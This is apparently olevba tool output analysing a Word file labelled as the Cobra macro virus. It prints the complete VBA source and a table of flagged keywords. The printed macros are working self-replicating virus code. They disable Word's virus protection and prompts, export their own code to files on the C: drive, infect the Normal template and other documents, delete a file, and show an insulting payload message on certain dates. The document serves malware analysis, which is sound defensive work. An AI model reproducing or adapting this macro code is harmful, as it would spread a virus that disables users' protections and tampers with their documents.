olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.z-608eff7356cbbdbddf49a6dd52aaddc1917d2d8f
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ma14003.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\ethan.___", 6) = "" Then
Open "c:\ethan.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\ethan.___", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
Private Sub CommandButton1_Click()
If MsgBox("Send form to Personnel?", vbOKCancel, Timesheet) = vbOK Then
    MsgBox "Please remember to type ""Personnel UK"" in the to field of the mail message which will appear next"
    SendForm
ActiveDocument.Close (wdDoNotSaveChanges)
End If
End Sub

Private Sub CommandButton2_Click()
SaveDoc
End Sub

Private Sub Document_New()

End Sub
Sub AutoOpen()
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
On Error GoTo out
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
Options.VirusProtection = False
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
Options.SaveNormalPrompt = False
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
Options.ConfirmConversions = False
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
If nt > 70 And ad > 0 Then GoTo out
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
If nt < 70 Then
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
End If
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
host.CodeModule.AddFromFile ("c:\class.sys")
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
With host.CodeModule
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
    For x = 1 To 4
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
    .deletelines 1
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
    Next x
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
End With
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
If nt < 70 Then
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
    With host.CodeModule
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
    .replaceline 1, "Sub AutoClose()"
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
    .replaceline 71, "Sub ToolsMacro()"
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
    End With
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
End If
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
With host.CodeModule
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
    For x = 2 To 72 Step 2
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
    Next x
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
End With
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
out:
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
End Sub
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
Sub ViewVBCode()
'bear1999/8/31 05:32:29 PMEPSON Stylus COLOR 1520 - LPT1:義工基本資料.doc
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

